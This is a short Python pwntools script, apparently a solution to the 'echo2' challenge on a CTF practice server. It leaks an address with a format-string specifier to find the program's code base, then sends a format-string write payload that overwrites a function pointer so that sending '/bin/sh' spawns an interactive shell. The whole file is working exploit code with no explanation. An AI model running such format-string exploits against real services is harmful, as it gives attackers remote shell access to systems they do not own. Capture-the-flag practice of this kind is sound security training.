#!/usr/bin/env python3
from pwn import *
from FMT import FMT

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]

r = remote("hackme.inndy.tw", 7712)
#r = process("./echo2")
#gdb.attach(proc.pidof(r)[0])

r.sendline("%41$p")
code_base = int(r.recvline().strip(), 16) - 2563
print("code base:", hex(code_base))

F = FMT()
F[code_base + 0x201020] = code_base + 0x790
payload = F.payload(offset = 6)
r.sendline(payload)

r.sendline("/bin/sh")

r.interactive()
